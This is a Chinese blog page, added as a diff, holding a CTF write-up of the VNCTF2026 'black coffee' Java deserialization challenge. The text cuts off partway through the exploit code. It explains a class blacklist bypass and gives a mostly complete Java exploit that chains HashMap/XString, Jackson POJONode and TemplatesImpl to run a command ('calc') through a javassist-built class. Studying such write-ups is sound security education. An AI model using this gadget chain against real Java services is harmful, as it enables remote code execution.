@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+<script>
+  (function () {
+    var OriginTitle = document.title;
+    var titleTime;
+    document.addEventListener('visibilitychange', function () {
+      if (document.hidden) {
+        document.title = '坏人！看完了就想走' + OriginTitle;
+        clearTimeout(titleTime);
+      } else {
+        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
+        titleTime = setTimeout(function () {
+          document.title = OriginTitle;
+        }, 2000);
+      }
+    });
+  })();
+</script>
+
+    <meta name="description" content="复现一下java题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VNCTF2026 black coffee">
+<meta property="og:url" content="https://wanth3f1ag.top/2026/03/08/VNCTF2026-black-coffee/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="复现一下java题">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/VNCTF/image-20260308131526369.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/VNCTF/image-20260308141934973.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/VNCTF/image-20260308145438380.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/VNCTF/image-20260308150425360.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/VNCTF/image-20260308144639220.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/VNCTF/image-20260308155032340.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/VNCTF/image-20260308155250821.png">
+<meta property="article:published_time" content="2026-03-08T04:28:56.000Z">
+<meta property="article:modified_time" content="2026-03-08T07:57:33.027Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="javasec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/VNCTF/image-20260308131526369.png">
+
+
+<link rel="canonical" href="https://wanth3f1ag.top/2026/03/08/VNCTF2026-black-coffee/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2026/03/08/VNCTF2026-black-coffee/","path":"2026/03/08/VNCTF2026-black-coffee/","title":"VNCTF2026 black coffee"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>VNCTF2026 black coffee | root@wanth3f1ag</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">root@wanth3f1ag</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTFer</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9C%80%E7%BB%88exp"><span class="nav-number">2.</span> <span class="nav-text">最终exp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3"><span class="nav-number">3.</span> <span class="nav-text">问题解决</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">wanTh3flag</p>
+  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">192</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">122</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2026/03/08/VNCTF2026-black-coffee/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="wanTh3flag">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="root@wanth3f1ag">
+      <meta itemprop="description" content="一条有梦想的咸鱼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="VNCTF2026 black coffee | root@wanth3f1ag">
+      <meta itemprop="description" content="复现一下java题">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          VNCTF2026 black coffee
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-03-08 12:28:56 / 修改时间：15:57:33" itemprop="dateCreated datePublished" datetime="2026-03-08T12:28:56+08:00">2026-03-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/javasec/" itemprop="url" rel="index"><span itemprop="name">javasec</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>10k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>9 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">复现一下java题</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>参考官方wp做一下简单的复现</p>
+<p>给了Docker文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FROM openjdk:17.0.1-jdk-slim</span><br><span class="line">COPY black-coffee-1.0-SNAPSHOT.jar /app/app.jar</span><br><span class="line">COPY start.sh /start.sh</span><br><span class="line">WORKDIR /app</span><br><span class="line">EXPOSE 8083</span><br><span class="line">ENTRYPOINT [&quot;/bin/bash&quot;, &quot;/start.sh&quot;]</span><br></pre></td></tr></table></figure>
+
+<p>jdk版本是17，那还涉及到了高版本jdk了</p>
+<p>依旧jadx反编译一下</p>
+<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>先看依赖</p>
+<p><img src="/../image/achieve/202411/VNCTF/image-20260308131526369.png" alt="image-20260308131526369"></p>
+<p>看到有Jackson，可以打Jackson原生反序列化</p>
+<p>封装了一个CoffeeObjectInputStream</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.blackcoffee;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InvalidClassException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: black-coffee-1.0-SNAPSHOT.jar:BOOT-INF/classes/org/example/blackcoffee/CoffeeObjectInputStream.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CoffeeObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ArrayList&lt;String&gt; BLACKLIST = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;javax.swing&quot;</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;java.security&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CoffeeObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// java.io.ObjectInputStream</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        Iterator&lt;String&gt; it = BLACKLIST.iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> it.next();</span><br><span class="line">            <span class="keyword">if</span> (desc.getName().startsWith(s)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;bad for coffee: &quot;</span>, desc.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>有两个黑名单，一个是<code>javax.swing</code>，限制了EventListenerList触发toString链，另一个是<code>java.security</code>，应该是限制了SignedObject二次反序列化触发链</p>
+<p>Jackson原生反序列化的链子原先是这样的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">触发toString链-&gt;</span><br><span class="line">    POJONode#toString()-&gt;</span><br><span class="line">        ObjectMapper#writeValueAsString()-&gt;</span><br><span class="line">            触发任意类getter方法</span><br></pre></td></tr></table></figure>
+
+<p>先看看如何触发toString</p>
+<p>需要注意这里的jdk17，高版本触发toString的方法我也总结过 <a href="https://wanth3f1ag.top/2026/02/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E9%AB%98%E7%89%88%E6%9C%AC%E8%A7%A6%E5%8F%91toString%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/">https://wanth3f1ag.top/2026/02/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E9%AB%98%E7%89%88%E6%9C%AC%E8%A7%A6%E5%8F%91toString%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</a></p>
+<p>这里用HashMap+XString触发toString吧</p>
+<p>触发任意getter的话我们还是用 TemplatesImpl 加载字节码吧</p>
+<h1 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h1><p>注意，因为高版本反射调用的区别，这里需要在开头做一个unsafe的绕过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.blackcoffee;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> javassist.CtNewConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        bypassModule(exp.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        overrideJackson();</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxy);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> get_HashMap_XString(pojoNode);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义序列化操作</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;poc.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义反序列化操作</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CoffeeObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CoffeeObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getTemplatesImpl</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> createWithoutConstructor(Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">transformerFactoryImpl</span> <span class="operator">=</span> createWithoutConstructor(Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">byte</span>[] foo = pool.makeClass(<span class="string">&quot;Foo&quot;</span>).toBytecode();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;whatever&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_sdom&quot;</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transformerFactoryImpl);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>,  <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytes, foo&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> getPOJONodeStableProxy(templates);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getTemplatesImpl</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        bypassModule(Class.forName(<span class="string">&quot;javassist.util.proxy.SecurityActions&quot;</span>));</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(</span><br><span class="line">                CtNewConstructor.make(<span class="string">&quot;public Evil() &#123;&quot;</span>+</span><br><span class="line">                                <span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;); &#125;&quot;</span></span><br><span class="line">                        , ctClass)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecode = ctClass.toBytecode();</span><br><span class="line">        <span class="keyword">return</span> getTemplatesImpl(bytecode);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">overrideJackson</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        bypassModule(Class.forName(<span class="string">&quot;javassist.util.proxy.SecurityActions&quot;</span>));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().get(<span 